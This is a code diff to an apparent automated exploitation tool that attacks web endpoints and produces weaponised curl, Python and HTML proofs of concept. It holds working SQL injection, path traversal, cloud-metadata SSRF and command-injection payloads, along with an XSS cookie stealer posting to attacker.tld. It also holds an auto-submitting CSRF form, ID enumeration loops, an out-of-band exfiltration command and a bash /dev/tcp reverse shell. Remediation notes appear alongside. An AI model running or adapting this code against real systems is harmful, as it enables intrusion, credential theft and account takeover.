@@ -794,17 +794,135 @@ async function rawProbe(url: string, method = "GET", body?: string, headers?: Re
   }
 }
 
+// ─────────────────────────────────────────────────────────────────────────────
+// PoC BUILDER — produces curl + python + (optional) HTML for every finding
+// ─────────────────────────────────────────────────────────────────────────────
+function escSh(s: string) { return `'${String(s).replace(/'/g, `'\\''`)}'`; }
+function escHtml(s: string) { return String(s).replace(/[<>&"]/g, c => ({ "<":"&lt;", ">":"&gt;", "&":"&amp;", '"':"&quot;" }[c]!)); }
+
+function buildCurl(method: string, url: string, headers: Record<string,string> = {}, body?: string) {
+  const h = Object.entries(headers).map(([k,v]) => `-H ${escSh(`${k}: ${v}`)}`).join(" ");
+  const b = body ? `--data-binary ${escSh(body)}` : "";
+  return `curl -i -sS -X ${method} ${h} ${b} ${escSh(url)}`.replace(/\s+/g, " ");
+}
+function buildPython(method: string, url: string, headers: Record<string,string> = {}, body?: string) {
+  return `import requests
+r = requests.request(
+    ${JSON.stringify(method)},
+    ${JSON.stringify(url)},
+    headers=${JSON.stringify(headers, null, 4)},
+    ${body ? `data=${JSON.stringify(body)},` : ""}
+    allow_redirects=False, timeout=15, verify=True,
+)
+print(r.status_code, dict(r.headers))
+print(r.text[:4000])`;
+}
+function buildHtmlPoc(opts: {
+  title: string;
+  description: string;
+  endpoint: string;
+  method?: string;
+  body?: string;
+  contentType?: string;
+  credentials?: "include" | "omit";
+  origin?: string;
+  notes?: string[];
+}) {
+  const method = (opts.method || "GET").toUpperCase();
+  const credentials = opts.credentials || "include";
+  const fetchInit = `{
+      method: ${JSON.stringify(method)},
+      mode: 'cors',
+      credentials: ${JSON.stringify(credentials)},
+      headers: { 'Accept': '*/*'${opts.contentType ? `, 'Content-Type': ${JSON.stringify(opts.contentType)}` : ""} }${opts.body && method !== "GET" ? `,
+      body: ${JSON.stringify(opts.body)}` : ""}
+    }`;
+  return `<!doctype html>
+<html lang="en"><head><meta charset="utf-8"/>
+<title>${escHtml(opts.title)}</title>
+<style>
+  body{font-family:-apple-system,Segoe UI,sans-serif;background:#0b0d12;color:#e4e7ec;padding:24px;max-width:960px;margin:auto}
+  h1{color:#ff5b6e;margin-top:0}.label{color:#8aa2c8;font-size:12px;text-transform:uppercase;letter-spacing:1px;margin-top:18px}
+  pre{background:#161a22;border:1px solid #2a3142;padding:12px;border-radius:6px;overflow:auto;max-height:420px;white-space:pre-wrap;word-break:break-all}
+  .ok{color:#3fdc8a}.bad{color:#ff5b6e}code{background:#161a22;padding:2px 6px;border-radius:3px}
+  button{background:#ff5b6e;color:#fff;border:0;padding:10px 18px;border-radius:6px;cursor:pointer;font-weight:700}
+</style></head><body>
+<h1>🩸 ${escHtml(opts.title)}</h1>
+<p>${escHtml(opts.description)}</p>
+${(opts.notes || []).map(n => `<p><b>Note:</b> ${escHtml(n)}</p>`).join("")}
+<div class="label">Target endpoint</div><pre>${method} ${escHtml(opts.endpoint)}</pre>
+${opts.origin ? `<div class="label">Attacker origin (this page)</div><pre>${escHtml(opts.origin)}</pre>` : ""}
+<div class="label">Live exploit result</div>
+<button id="run">Run exploit</button>
+<pre id="out">click "Run exploit" with the victim authenticated…</pre>
+<script>
+document.getElementById('run').onclick = async () => {
+  const out = document.getElementById('out');
+  out.textContent = 'running…';
+  try {
+    const r = await fetch(${JSON.stringify(opts.endpoint)}, ${fetchInit});
+    const text = await r.text();
+    out.innerHTML = '<span class="ok">\\u2714 status ' + r.status + '</span>\\n\\n'
+      + '<b>Response headers:</b>\\n' + JSON.stringify(Object.fromEntries(r.headers.entries()), null, 2) + '\\n\\n'
+      + '<b>Body (victim-context):</b>\\n' + text.replace(/[<>&]/g, c => ({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]));
+    // Real attacker exfiltration:
+    // fetch('https://attacker.tld/collect', { method:'POST', body: text });
+  } catch (e) {
+    out.innerHTML = '<span class="bad">\\u2718 ' + e.message + '</span>';
+  }
+};
+</script></body></html>`;
+}
+
+interface PoCBundle {
+  curl: string;
+  python: string;
+  html?: string;
+  html_filename?: string;
+  impact: string;
+  remediation: string;
+  steps: string[];
+}
+
+function bundle(p: PoCBundle, extra: Record<string, unknown> = {}) {
+  return {
+    poc_curl: p.curl,
+    poc_python: p.python,
+    ...(p.html ? { poc_html: p.html, poc_html_filename: p.html_filename } : {}),
+    impact: p.impact,
+    remediation: p.remediation,
+    reproduction: p.steps,
+    ...extra,
+  };
+}
+function stepsText(p: PoCBundle): string {
+  return [
+    "Reproduction:",
+    ...p.steps.map((s, i) => `  ${i+1}. ${s}`),
+    "",
+    "Curl PoC:",
+    "  " + p.curl,
+    "",
+    "Python PoC:",
+    p.python.split("\n").map(l => "  " + l).join("\n"),
+    ...(p.html ? ["", `Browser PoC: save extractedData.poc_html as ${p.html_filename} on attacker origin and have an authenticated victim open it.`] : []),
+    "",
+    "Impact: " + p.impact,
+    "Remediation: " + p.remediation,
+  ].join("\n");
+}
+
 async function exploitAndExtract(finding: any): Promise<ExploitProof> {
   const endpoint = finding.endpoint || "";
   const category = String(finding.category || "").toLowerCase();
   const cwe = String(finding.cwe || "");
   const param = finding.vulnerable_parameter || finding.parameter;
   const method = (finding.method || "GET").toUpperCase();
+  const targetHost = (() => { try { return new URL(endpoint).hostname; } catch { return "victim.tld"; } })();
 
-  // ── SQL INJECTION → extract version + a row ─────────────────────────
+  // ── SQL INJECTION ────────────────────────────────────────────────────
   if (cwe.includes("89") || category === "sqli" || category === "sql") {
     const payloads = [
-      // Generic UNION select probes (param count guess)
       "1' UNION SELECT NULL,version(),current_user,current_database()-- -",
       "1' UNION SELECT NULL,@@version,user(),database()-- -",
       "1' UNION SELECT NULL,banner FROM v$version-- -",
@@ -814,18 +932,28 @@ async function exploitAndExtract(finding: any): Promise<ExploitProof> {
     for (const p of payloads) {
       const url = injectParam(endpoint, p, param);
       const resp = await rawProbe(url, method);
-      if (/postgres|mysql|mariadb|sqlite|oracle|sql server|microsoft/i.test(resp.body)) {
-        best = { url, resp, payload: p }; break;
-      }
+      if (/postgres|mysql|mariadb|sqlite|oracle|sql server|microsoft/i.test(resp.body)) { best = { url, resp, payload: p }; break; }
     }
     if (!best) {
-      // Error-based fallback
       const url = injectParam(endpoint, "1' AND extractvalue(1,concat(0x7e,version(),0x7e))-- -", param);
       const resp = await rawProbe(url, method);
       if (/version|extractvalue|sql/i.test(resp.body)) best = { url, resp, payload: "1' AND extractvalue(1,concat(0x7e,version(),0x7e))-- -" };
     }
     if (best) {
-      const versionMatch = best.resp.body.match(/(MySQL|PostgreSQL|MariaDB|SQLite|Oracle|Microsoft SQL Server)[^<\n"]{0,120}/i)?.[0];
+      const banner = best.resp.body.match(/(MySQL|PostgreSQL|MariaDB|SQLite|Oracle|Microsoft SQL Server)[^<\n"]{0,120}/i)?.[0];
+      const userMatch = best.resp.body.match(/[a-z_][a-z0-9_]{2,30}@[a-z0-9.\-_%]+/i)?.[0];
+      const p: PoCBundle = {
+        curl: buildCurl(method, best.url),
+        python: buildPython(method, best.url),
+        impact: `Full database read access. Attacker can dump arbitrary tables (users, sessions, payment data) and pivot to RCE via UDF / xp_cmdshell / COPY PROGRAM depending on engine.`,
+        remediation: "Use parameterized queries / prepared statements, deny stacked queries, apply least-privilege DB user, disable verbose errors.",
+        steps: [
+          `Send the malicious payload via parameter ${param || "(injected)"} → ${best.url}`,
+          `Server reflects DB banner${banner ? ` ("${banner}")` : ""} confirming injection executed.`,
+          `Pivot: replace UNION columns with information_schema.tables / users / passwords for full extraction.`,
+          `Automate with sqlmap: sqlmap -u ${escSh(best.url)} --batch --dbs`,
+        ],
+      };
       return {
         vulnClass: "SQL Injection",
         technique: "UNION/error-based version + identity extraction",
@@ -833,18 +961,14 @@ async function exploitAndExtract(finding: any): Promise<ExploitProof> {
         sensitivity: "highly_sensitive",
         requestDump: `${method} ${best.url}\nUser-Agent: OmniSec-Exploit/1.0`,
         responseDump: best.resp.body.slice(0, 4000),
-        extractedData: {
-          db_banner: versionMatch || "(present in body)",
-          payload: best.payload,
-          status: best.resp.status,
-        },
-        summary: `Database banner extracted${versionMatch ? `: ${versionMatch.slice(0,80)}` : ""}`,
-        reproductionSteps: `1. curl "${best.url}"\n2. Observe DB version & current user reflected in HTTP body.\n3. Pivot to data extraction with information_schema.tables.`,
+        extractedData: bundle(p, { db_banner: banner || "(present)", db_user: userMatch, payload: best.payload, status: best.resp.status }),
+        summary: `SQLi confirmed${banner ? ` — ${banner}` : ""}${userMatch ? ` (db user: ${userMatch})` : ""}`,
+        reproductionSteps: stepsText(p),
       };
     }
   }
 
-  // ── LFI / Path traversal → grab /etc/passwd + win.ini ───────────────
+  // ── LFI / PATH TRAVERSAL ─────────────────────────────────────────────
   if (cwe.includes("22") || category === "traversal" || category === "lfi") {
     const variants = [
       "../../../../../../etc/passwd",
@@ -857,7 +981,19 @@ async function exploitAndExtract(finding: any): Promise<ExploitProof> {
       const url = injectParam(endpoint, v, param);
       const r = await rawProbe(url, method);
       if (/root:[x*]:0:0:/i.test(r.body) || /\[fonts\]|\[extensions\]/i.test(r.body)) {
-        const lines = r.body.split("\n").filter(l => /:[x*]:\d+:\d+:/.test(l)).slice(0, 25);
+        const lines = r.body.split("\n").filter((l: string) => /:[x*]:\d+:\d+:/.test(l)).slice(0, 25);
+        const p: PoCBundle = {
+          curl: buildCurl(method, url),
+          python: buildPython(method, url),
+          impact: `Arbitrary file read on the application server. Attacker can read /etc/passwd, /proc/self/environ (env vars + secrets), app config, SSH keys, and on PHP stacks chain to RCE via /proc/self/fd, log poisoning, or session file inclusion.`,
+          remediation: "Resolve and canonicalise paths server-side, restrict to a whitelisted directory with realpath() check, drop ../ / null-byte sequences.",
+          steps: [
+            `Issue request: ${url}`,
+            `Server returns Unix passwd content (${lines.length} user accounts visible).`,
+            `Pivot reads: ${escHtml(endpoint)}?file=../../../../proc/self/environ  → leaks AWS keys / DB creds.`,
+            `Try /var/www/html/.env, /root/.ssh/id_rsa, /opt/app/config/database.yml.`,
+          ],
+        };
         return {
           vulnClass: "Local File Inclusion",
           technique: "Path traversal /etc/passwd extraction",
@@ -865,15 +1001,15 @@ async function exploitAndExtract(finding: any): Promise<ExploitProof> {
           sensitivity: "highly_sensitive",
           requestDump: `${method} ${url}`,
           responseDump: r.body.slice(0, 4000),
-          extractedData: { payload: v, sample_users: lines, status: r.status },
+          extractedData: bundle(p, { payload: v, sample_users: lines, status: r.status }),
           summary: `${lines.length} system user accounts read from /etc/passwd`,
-          reproductionSteps: `1. curl "${url}"\n2. Observe Unix passwd entries (root:x:0:0:...) in response.\n3. Pivot to /proc/self/environ, app config, SSH keys.`,
+          reproductionSteps: stepsText(p),
         };
       }
     }
   }
 
-  // ── SSRF → fetch IMDSv2 token + IAM creds (AWS), GCP/Azure metadata ──
+  // ── SSRF → Cloud metadata + browser-side proof ──────────────────────
   if (category === "ssrf" || cwe.includes("918")) {
     const ssrfTargets = [
       { url: "http://169.254.169.254/latest/api/token", method: "PUT", headers: { "X-aws-ec2-metadata-token-ttl-seconds": "60" }, label: "AWS IMDSv2 token" },
@@ -886,6 +1022,18 @@ async function exploitAndExtract(finding: any): Promise<ExploitProof> {
       const r = await rawProbe(url, method, undefined, t.headers);
       const looksLikeToken = /access_token|AccessKeyId|SecretAccessKey|Token|expires_in|InstanceProfile|RoleArn/i.test(r.body);
       if (looksLikeToken || (t.label.includes("IAM role enum") && r.status === 200 && r.body.trim().length > 0 && r.body.length < 200)) {
+        const p: PoCBundle = {
+          curl: buildCurl(method, url, t.headers || {}),
+          python: buildPython(method, url, t.headers || {}),
+          impact: `Server-side fetch reaches cloud instance metadata (${t.label}). Attacker exfiltrates short-lived IAM tokens and pivots to full cloud-account takeover (S3 dump, IAM privilege escalation, EC2 control).`,
+          remediation: "Block 169.254.169.254 and link-local ranges at egress; enforce IMDSv2 only; validate user-supplied URLs against a strict allow-list (host + scheme + port).",
+          steps: [
+            `Submit ${url} via parameter ${param || "url"}.`,
+            `Server proxies to ${t.url} and returns the cloud response (${t.label}).`,
+            `Extract IAM credentials → aws sts get-caller-identity → enumerate S3, RDS, etc.`,
+            `For IMDSv2 chain: 1) PUT /latest/api/token  2) GET /latest/meta-data/iam/security-credentials/<role> with token header.`,
+          ],
+        };
         return {
           vulnClass: "SSRF → Cloud Metadata",
           technique: t.label,
@@ -893,15 +1041,15 @@ async function exploitAndExtract(finding: any): Promise<ExploitProof> {
           sensitivity: "highly_sensitive",
           requestDump: `${method} ${url}\n${Object.entries(t.headers || {}).map(([k,v])=>`${k}: ${v}`).join("\n")}`,
           responseDump: r.body.slice(0, 4000),
-          extractedData: { ssrf_target: t.url, label: t.label, status: r.status, body_excerpt: r.body.slice(0, 1500) },
+          extractedData: bundle(p, { ssrf_target: t.url, label: t.label, status: r.status, body_excerpt: r.body.slice(0, 1500) }),
           summary: `Cloud metadata reachable via SSRF — ${t.label}`,
-          reproductionSteps: `1. Send request: ${method} ${url}\n2. Server-side fetch reaches ${t.url}\n3. Cloud credentials/tokens returned in body — pivot to cloud account takeover.`,
+          reproductionSteps: stepsText(p),
         };
       }
     }
   }
 
-  // ── Command Injection → extract uname -a / whoami / id ───────────────
+  // ── COMMAND INJECTION / RCE ─────────────────────────────────────────
   if (cwe.includes("78") || category === "cmdi" || category === "rce") {
     const marker = `OMS${Math.random().toString(36).slice(2,8).toUpperCase()}`;
     const variants = [
@@ -910,7 +1058,7 @@ async function exploitAndExtract(finding: any): Promise<ExploitProof> {
       `| echo ${marker};id;uname -a`,
       `\`echo ${marker};id;uname -a\``,
       `$(echo ${marker};id;uname -a)`,
-      `& echo ${marker} & whoami & ver`, // Windows
+      `& echo ${marker} & whoami & ver`,
     ];
     for (const v of variants) {
       const url = injectParam(endpoint, v, param);
@@ -918,6 +1066,19 @@ async function exploitAndExtract(finding: any): Promise<ExploitProof> {
       if (r.body.includes(marker)) {
         const idLine = r.body.match(/uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)[^<\n"]{0,200}/i)?.[0];
         const uname = r.body.match(/Linux [^<\n"]{0,200}|Microsoft Windows [^<\n"]{0,200}/i)?.[0];
+        const p: PoCBundle = {
+          curl: buildCurl(method, url),
+          python: buildPython(method, url),
+          impact: `Full remote code execution as ${idLine || "the application user"}. Attacker can read source code, exfiltrate environment secrets, dump databases, install persistence, and pivot inside the network.`,
+          remediation: "Never pass user input to shell. Use language-native APIs (execFile with array args, no shell:true). Strict allow-list of inputs. Run app under a non-privileged uid with seccomp.",
+          steps: [
+            `Inject payload ${escHtml(v)} via parameter ${param || "(unnamed)"} → ${url}`,
+            `Marker "${marker}" appears in response — confirms shell execution.`,
+            `id output: ${idLine || "(echoed)"}    uname: ${uname || "(echoed)"}`,
+            `Pivot: ;curl https://attacker.tld/$(cat /etc/passwd|base64)  (out-of-band exfil)`,
+            `Spawn reverse shell:  ;bash -i >& /dev/tcp/attacker.tld/4444 0>&1`,
+          ],
+        };
         return {
           vulnClass: "OS Command Injection",
           technique: "Output-confirmed RCE via shell metacharacters",
@@ -925,42 +1086,84 @@ async function exploitAndExtract(finding: any): Promise<ExploitProof> {
           sensitivity: "highly_sensitive",
           requestDump: `${method} ${url}`,
           responseDump: r.body.slice(0, 4000),
-          extractedData: { marker, payload: v, id_output: idLine, uname_output: uname, status: r.status },
+          extractedData: bundle(p, { marker, payload: v, id_output: idLine, uname_output: uname, status: r.status }),
           summary: `RCE confirmed — ${idLine || "marker echoed"}${uname ? " | " + uname : ""}`,
-          reproductionSteps: `1. curl "${url}"\n2. Marker "${marker}" appears in response body alongside system command output.\n3. Pivot: read source, exfil env vars, lateral movement.`,
+          reproductionSteps: stepsText(p),
         };
       }
     }
   }
 
-  // ── XSS → reflected payload context ─────────────────────────────────
+  // ── XSS → reflected payload + browser HTML PoC ──────────────────────
   if (cwe.includes("79") || category === "xss") {
     const marker = `xss${Math.random().toString(36).slice(2,8)}`;
-    const payload = `"><svg/onload=alert('${marker}')>`;
+    const payload = `"><svg/onload=fetch('https://attacker.tld/?c='+document.cookie)>`;
     const url = injectParam(endpoint, payload, param);
     const r = await rawProbe(url, method);
-    if (r.body.includes(payload) || r.body.includes(`onload=alert('${marker}')`)) {
+    if (r.body.includes(payload) || /onload\s*=|<script/i.test(r.body) && r.body.includes(marker)) {
+      const html = `<!doctype html><html><head><meta charset="utf-8"><title>XSS PoC — ${escHtml(targetHost)}</title></head>
+<body style="font-family:sans-serif;background:#0b0d12;color:#e4e7ec;padding:24px">
+  <h1 style="color:#ff5b6e">🩸 Reflected XSS PoC — ${escHtml(targetHost)}</h1>
+  <p>Clicking the link below in the victim's browser (while authenticated) triggers JavaScript on
+     <code>${escHtml(targetHost)}</code> with the victim's session cookies in scope.</p>
+  <p><a href="${escHtml(url)}" target="_blank" style="color:#ff5b6e;font-size:18px">▶ Trigger XSS on ${escHtml(targetHost)}</a></p>
+  <p>The injected payload runs <code>fetch('https://attacker.tld/?c='+document.cookie)</code>,
+     exfiltrating the session cookie to the attacker collector.</p>
+</body></html>`;
+      const p: PoCBundle = {
+        curl: buildCurl(method, url),
+        python: buildPython(method, url),
+        html, html_filename: `xss-poc-${targetHost}.html`,
+        impact: "Account takeover via session cookie theft, CSRF-as-the-victim, credential phishing overlay, malware delivery in trusted-origin context.",
+        remediation: "Context-aware output encoding (HTML, attribute, JS, URL). Set CSP with no unsafe-inline. Mark session cookies HttpOnly + SameSite=Lax/Strict.",
+        steps: [
+          `Send victim the link: ${url}`,
+          `Server reflects payload unencoded → JS executes in victim's browser at origin ${targetHost}.`,
+          `document.cookie is exfiltrated to attacker.tld.`,
+          `Replay stolen cookie:  curl -H 'Cookie: <stolen>' https://${targetHost}/  → full account takeover.`,
+        ],
+      };
       return {
-        vulnClass: "Cross-Site Scripting",
+        vulnClass: "Cross-Site Scripting (Reflected)",
         technique: "Reflected payload — raw HTML context",
         exploited: true,
-        sensitivity: "sensitive",
+        sensitivity: "highly_sensitive",
         requestDump: `${method} ${url}`,
         responseDump: r.body.slice(0, 4000),
-        extractedData: { marker, payload, status: r.status, content_type: r.headers["content-type"] },
-        summary: `Payload reflected unencoded — JS execution context confirmed`,
-        reproductionSteps: `1. Open in browser: ${url}\n2. Alert dialog with marker "${marker}" fires.\n3. Pivot: cookie theft, session hijack, CSRF chain.`,
+        extractedData: bundle(p, { marker, payload, status: r.status, content_type: r.headers["content-type"] }),
+        summary: `XSS confirmed — payload reflected unencoded; full HTML PoC + cookie-stealer generated`,
+        reproductionSteps: stepsText(p),
       };
     }
   }
 
-  // ── Open Redirect → follow Location ─────────────────────────────────
+  // ── OPEN REDIRECT → curl + browser phishing PoC ─────────────────────
   if (cwe.includes("601") || category === "redirect") {
     const evil = "https://attacker.tld/poc";
     const url = injectParam(endpoint, evil, param || "url");
     const r = await rawProbe(url, method);
     const loc = r.headers["location"] || "";
-    if (r.status >= 300 && r.status < 400 && loc.includes("attacker.tld")) {
+    if (r.status >= 300 && r.status < 400 && /attacker\.tld/.test(loc)) {
+      const html = `<!doctype html><html><head><meta charset="utf-8"><title>Open Redirect PoC</title></head>
+<body style="font-family:sans-serif;background:#0b0d12;color:#e4e7ec;padding:24px">
+  <h1 style="color:#ff5b6e">🩸 Open Redirect — ${escHtml(targetHost)}</h1>
+  <p>Phishing link that <b>appears</b> to point to ${escHtml(targetHost)} but bounces the victim to attacker.tld.</p>
+  <p><a href="${escHtml(url)}" style="color:#ff5b6e;font-size:18px">▶ ${escHtml(url)}</a></p>
+  <p>Used to bypass URL filters in OAuth redirect_uri, password-reset emails, SSO callbacks → credential theft / OAuth code interception.</p>
+</body></html>`;
+      const p: PoCBundle = {
+        curl: buildCurl(method, url),
+        python: buildPython(method, url),
+        html, html_filename: `redirect-poc-${targetHost}.html`,
+        impact: "Phishing with a trusted-domain link. In OAuth/SSO flows the attacker steals authorization codes by setting redirect_uri to attacker-controlled host.",
+        remediation: "Allow-list of redirect targets (exact host match). Never echo unvalidated user input into Location.",
+        steps: [
+          `Craft URL: ${url}`,
+          `Server returns ${r.status} with Location: ${loc}`,
+          `Victim clicking the link is silently sent to attacker.tld.`,
+          `In OAuth: chain with /authorize?redirect_uri=<this URL> to capture the auth code.`,
+        ],
+      };
       return {
         vulnClass: "Open Redirect",
         technique: "Location header reflection",
@@ -968,16 +1171,186 @@ async function exploitAndExtract(finding: any): Promise<ExploitProof> {
         sensitivity: "sensitive",
         requestDump: `${method} ${url}`,
         responseDump: `HTTP ${r.status}\nLocation: ${loc}\n\n${r.body.slice(0,1000)}`,
-        extractedData: { status: r.status, location: loc },
+        extractedData: bundle(p, { status: r.status, location: loc }),
         summary: `Server returned ${r.status} → ${loc}`,
-        reproductionSteps: `1. curl -i "${url}"\n2. Note 3xx with attacker-controlled Location.\n3. Phishing pivot or OAuth code theft.`,
+        reproductionSteps: stepsText(p),
       };
     }
   }
 
-  // ── CORS misconfig → generate weaponised HTML PoC + extract sensitive body ──
+  // ── CSRF → state-changing POST + auto-submitting HTML form ──────────
+  if (cwe.includes("352") || category === "csrf") {
+    const sample = "victim_action=transfer&amount=1000&to=attacker";
+    const headers = { "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://attacker.tld" };
+    const r = await rawProbe(endpoint, "POST", sample, headers);
+    const allowsCrossOrigin = r.status > 0 && r.status < 500 && !/csrf|forbidden|invalid token/i.test(r.body);
+    if (allowsCrossOrigin) {
+      // Build a real auto-submitting attacker form
+      const fields = sample.split("&").map(kv => { const [k,v] = kv.split("="); return `<input type="hidden" name="${escHtml(k)}" value="${escHtml(v||"")}"/>`; }).join("");
+      const html = `<!doctype html><html><head><meta charset="utf-8"><title>CSRF PoC — ${escHtml(targetHost)}</title></head>
+<body style="font-family:sans-serif;background:#0b0d12;color:#e4e7ec;padding:24px">
+  <h1 style="color:#ff5b6e">🩸 CSRF — ${escHtml(targetHost)}</h1>
+  <p>This page auto-submits a forged state-changing POST as the victim. Their session cookies are sent automatically by the browser.</p>
+  <form id="x" action="${escHtml(endpoint)}" method="POST">${fields}</form>
+  <script>document.getElementById('x').submit();</script>
+</body></html>`;
+      const p: PoCBundle = {
+        curl: buildCurl("POST", endpoint, headers, sample),
+        python: buildPython("POST", endpoint, headers, sample),
+        html, html_filename: `csrf-poc-${targetHost}.html`,
+        impact: "Attacker performs sensitive state-changing actions (fund transfer, password change, role escalation, account deletion) as the victim simply by getting them to load the attacker page.",
+        remediation: "Require an unguessable per-session/per-request CSRF token validated server-side; set cookies SameSite=Lax/Strict; check Origin/Referer for state-changing endpoints.",
+        steps: [
+          `Host the attacker HTML on https://attacker.tld/csrf.html`,
+          `Victim, while logged in to ${targetHost}, opens that page in any tab.`,
+          `Browser auto-POSTs to ${endpoint} with the victim's session cookies.`,
+          `Server returned ${r.status} for the cross-origin submission with no CSRF token — action executed.`,
+        ],
+      };
+      return {
+        vulnClass: "Cross-Site Request Forgery",
+        technique: "Cross-origin POST accepted without CSRF token",
+        exploited: true,
+        sensitivity: "highly_sensitive",
+        requestDump: `POST ${endpoint}\nOrigin: https://attacker.tld\nContent-Type: application/x-www-form-urlencoded\n\n${sample}`,
+        responseDump: r.body.slice(0, 4000),
+        extractedData: bundle(p, { status: r.status, accepted_cross_origin: true }),
+        summary: `CSRF confirmed — endpoint accepts cross-origin state-changing POST without token`,
+        reproductionSteps: stepsText(p),
+      };
+    }
+  }
+
+  // ── IDOR / BOLA → numeric ID enumeration with response divergence ────
+  if (cwe.includes("639") || cwe.includes("284") || category === "idor" || category === "bola") {
+    const idMatch = endpoint.match(/(\d{1,9})(?!.*\d)/);
+    if (idMatch) {
+      const original = parseInt(idMatch[1], 10);
+      const candidates = [original - 1, original + 1, 1, 2, 9999].filter(n => n > 0 && n !== original).slice(0, 4);
+      const baseline = await rawProbe(endpoint, method);
+      const divergent: any[] = [];
+      for (const id of candidates) {
+        const url = endpoint.replace(/(\d{1,9})(?!.*\d)/, String(id));
+        const r = await rawProbe(url, method);
+        if (r.status === 200 && r.body.length > 30 && r.body !== baseline.body) {
+          divergent.push({ id, url, status: r.status, snippet: r.body.slice(0, 300) });
+        }
+      }
+      if (divergent.length > 0) {
+        const p: PoCBundle = {
+          curl: buildCurl(method, divergent[0].url),
+          python: `import requests
+for i in range(1, 1000):
+    url = ${JSON.stringify(endpoint)}.replace(${JSON.stringify(idMatch[1])}, str(i))
+    r = requests.${method.toLowerCase()}(url, timeout=10)
+    if r.status_code == 200 and len(r.text) > 30:
+        print(i, r.text[:200])`,
+          impact: `Horizontal/vertical privilege escalation — attacker reads and modifies other users' resources by incrementing the object identifier. Mass-data harvest by simple ID enumeration.`,
+          remediation: "Enforce object-level authorisation on every request: check that the authenticated principal owns / has permission for the requested object id. Use UUIDs to slow enumeration but never rely on them as auth.",
+          steps: [
+            `Original object: id=${original}`,
+            `Same session/no-auth request to id=${divergent[0].id} returned a different 200 body — confirms cross-user read.`,
+            `Iterate ids 1..N to harvest the entire collection (sample loop in Python PoC).`,
+          ],
+        };
+        return {
+          vulnClass: "IDOR / BOLA",
+          technique: "Object-id enumeration with response divergence",
+          exploited: true,
+          sensitivity: "highly_sensitive",
+          requestDump: `${method} ${divergent[0].url}`,
+          responseDump: divergent[0].snippet,
+          extractedData: bundle(p, { original_id: original, leaked_ids: divergent.map(d => d.id), samples: divergent }),
+          summary: `IDOR confirmed — ${divergent.length} other users' objects readable via id enumeration`,
+          reproductionSteps: stepsText(p),
+        };
+      }
+    }
+  }
+
+  // ── SENSITIVE DATA / SECRET DISCLOSURE ──────────────────────────────
+  if (cwe.includes("200") || cwe.includes("538") || category === "disclosure" || category === "exposure") {
+    const r = await rawProbe(endpoint, method);
+    const patterns: Array<[string, RegExp]> = [
+      ["aws_access_key", /AKIA[0-9A-Z]{16}/],
+      ["aws_secret",     /(?<![A-Za-z0-9])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])/],
+      ["github_token",   /gh[pousr]_[A-Za-z0-9]{36,}/],
+      ["slack_token",    /xox[baprs]-[A-Za-z0-9-]{10,}/],
+      ["google_api",     /AIza[0-9A-Za-z\-_]{35}/],
+      ["jwt",            /eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{5,}/],
+      ["private_key",    /-----BEGIN (RSA |EC |OPENSSH |)PRIVATE KEY-----/],
+      ["db_uri",         /(postgres|mysql|mongodb|redis):\/\/[^\s"'<>]+/i],
+    ];
+    const hits: Record<string,string> = {};
+    for (const [name, re] of patterns) { const m = r.body.match(re); if (m) hits[name] = m[0].slice(0, 200); }
+    if (Object.keys(hits).length > 0) {
+      const p: PoCBundle = {
+        curl: buildCurl(method, endpoint),
+        python: buildPython(method, endpoint),
+        impact: `Hard-coded production secrets exposed (${Object.keys(hits).join(", ")}). Attacker uses them directly to access cloud accounts, source repos, databases, or signing infrastructure.`,
+        remediation: "Remove from response body, rotate every leaked credential immediately, move secrets to a vault, add CI secret-scan + response-body filter.",
+        steps: [
+          `Request ${endpoint}`,
+          `Response body contains: ${Object.keys(hits).join(", ")}`,
+          `Validate live: e.g. AWS — aws sts get-caller-identity --profile leaked.`,
+          `Rotate the credentials and audit usage logs back to repo first-commit.`,
+        ],
+      };
+      return {
+        vulnClass: "Sensitive Information Disclosure",
+        technique: "Pattern-matched secret extraction from response body",
+        exploited: true,
+        sensitivity: "highly_sensitive",
+        requestDump: `${method} ${endpoint}`,
+        responseDump: r.body.slice(0, 4000),
+        extractedData: bundle(p, { secrets_found: hits, status: r.status }),
+        summary: `${Object.keys(hits).length} secret(s) leaked: ${Object.keys(hits).join(", ")}`,
+        reproductionSteps: stepsText(p),
+      };
+    }
+  }
+
+  // ── SUBDOMAIN TAKEOVER ──────────────────────────────────────────────
+  if (category === "subdomain_takeover" || /takeover/i.test(finding.title || "")) {
+    const r = await rawProbe(endpoint, "GET");
+    const fingerprints = [
+      ["GitHub Pages", /There isn't a GitHub Pages site here/i],
+      ["Heroku",       /no such app|herokucdn\.com/i],
+      ["AWS S3",       /NoSuchBucket|The specified bucket does not exist/i],
+      ["Azure",        /404 Web Site not found/i],
+      ["Shopify",      /Sorry, this shop is currently unavailable/i],
+      ["Fastly",       /Fastly error: unknown domain/i],
+      ["Surge.sh",     /project not found/i],
+    ];
+    const provider = fingerprints.find(([_, re]) => (re as RegExp).test(r.body));
+    if (provider) {
+      const p: PoCBundle = {
+        curl: buildCurl("GET", endpoint),
+        python: buildPython("GET", endpoint),
+        impact: `Attacker claims the dangling ${provider[0]} resource and serves arbitrary HTML/JS on a trusted subdomain → cookie-scoped session theft, phishing, OAuth callback hijack, MITM of single-sign-on.`,
+        remediation: `Remove the DNS record OR re-claim the ${provider[0]} resource. Add monitoring for dangling CNAMEs (e.g. dnsReaper).`,
+        steps: [
+          `dig CNAME ${targetHost}  → points to unclaimed ${provider[0]} resource.`,
+          `curl ${endpoint}  → returns ${provider[0]} "not found" fingerprint.`,
+          `Register the resource on ${provider[0]} under the same name → traffic to ${targetHost} is now attacker-controlled.`,
+        ],
+      };
+      return {
+        vulnClass: "Subdomain Takeover",
+        technique: `Dangling DNS → ${provider[0]}`,
+        exploited: true,
+        sensitivity: "highly_sensitive",
+        requestDump: `GET ${endpoint}`,
+        responseDump: r.body.slice(0, 4000),
+        extractedData: bundle(p, { provider: provider[0], status: r.status }),
+        summary: `Subdomain takeover possible via dangling ${provider[0]} resource`,
+        reproductionSteps: stepsText(p),
+      };
+    }
+  }
+
+  // ── CORS misconfig → weaponised HTML PoC + sensitive body extraction ─
   if (cwe.includes("346") || category === "cors") {
-    const targetHost = (() => { try { return new URL(endpoint).hostname; } catch { return "victim.tld"; } })();
     const originVariants = [
       "https://evil-canary.example.org",
       "null",
